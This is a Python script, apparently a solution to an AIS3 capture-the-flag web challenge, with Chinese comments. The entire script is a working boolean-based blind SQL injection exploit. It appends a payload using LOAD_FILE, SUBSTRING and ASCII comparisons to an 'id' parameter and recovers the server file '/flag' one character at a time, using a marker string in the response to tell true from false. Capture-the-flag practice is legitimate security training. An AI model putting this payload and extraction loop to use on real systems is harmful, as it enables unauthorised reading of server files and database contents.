import requests

# 目標URL
url = 'http://chals1.ais3.org:11454/song?id=1'
# 文件路徑
file_path = '/flag'
# 已知的flag，預設空字串
flag = ''

# 字元範圍
char_range = list(range(32, 127))  # 基本ASCII字符範圍
char_range += [ord(c) for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}']  # 增加更多常用字元符號



# 確認的標誌，當條件為True時，網頁回應中的標誌
true_indicator = 'MyGO!!!!!<br>'  # 當條件為True時回應中的標誌 (成功才會顯示MyGO!!!!!<br>)

print("開始讀取flag...")

# 存儲所有滿足條件的flag
flags = []

# 從第1個字元開始猜測
i = 1

while True:
    found_char = False

    for c in char_range:
        payload = f"+AND+IF(ASCII(SUBSTRING(LOAD_FILE('{file_path}'),{i},1))={c},1,0)+-- "
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'close'
        }
        r = requests.get(url + payload, headers=headers)

        if true_indicator in r.text:
            flag += chr(c)
            flags.append(flag)  # 將符合條件的flag存儲在列表中
            print(f'找到第{i}個字符: {chr(c)}')
            found_char = True
            break

    if not found_char:
        print('找不到更多字符，結束')
        break

    i += 1

print('讀取的flag:', flags)
